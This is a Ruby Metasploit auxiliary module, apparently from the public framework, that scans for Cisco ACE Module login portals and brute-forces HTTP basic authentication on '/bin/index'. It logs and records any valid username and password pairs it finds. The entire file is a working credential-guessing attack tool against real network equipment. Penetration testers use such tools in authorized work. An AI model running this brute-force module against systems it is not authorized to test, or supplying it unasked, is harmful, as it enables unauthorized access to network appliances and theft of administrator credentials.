##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

include Msf::Exploit::Remote::HttpClient
include Msf::Auxiliary::Report
include Msf::Auxiliary::AuthBrute
include Msf::Auxiliary::Scanner

def initialize(info={})
  super(update_info(info,
  'Name'           => 'Cisco ACE Module Login Utility',
  'Description'    => %{
    This module scans for Cisco ACE Module login portal, and
    performs a login brute force attack to identify valid credentials.
  },
  'Author'         =>
  [
    'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
  ],
  'License'        => MSF_LICENSE
  ))
end

def run_host(ip)
  print_status("#{peer} - Starting login brute force...")
  each_user_pass do |user, pass|
    do_start(user, pass)
  end
end

#
# Brute-force the login page
#

def do_start(user, pass)
  vprint_status("#{peer} - Trying username:#{user.inspect} with password:#{pass.inspect}")
  begin
    res = send_request_cgi(
    {
    'uri'       => '/bin/index',
    'method'    => 'GET',
    'authorization' => basic_auth(user,pass)
    })
  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
    vprint_error("#{peer} - HTTP Connection Failed...")
  return :abort
  end

  if (res and res.code == 200 and res.body.include?("Cisco ACE Module"))
    print_good("#{peer} - SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
    report_hash = {
    :host   => rhost,
    :port   => rport,
    :sname  => 'Cisco ACE Module',
    :user   => user,
    :pass   => pass,
    :active => true,
    :type => 'password'
    }
    report_auth_info(report_hash)
    return :next_user
  elsif (!res or res.code != 401 and !res.headers.include?('WWW-Authenticate'))
    vprint_error("#{peer} - Not a Cisco ACE box; moving on ...")
    return false
  else
    vprint_error("#{peer} - FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
  end
end
end
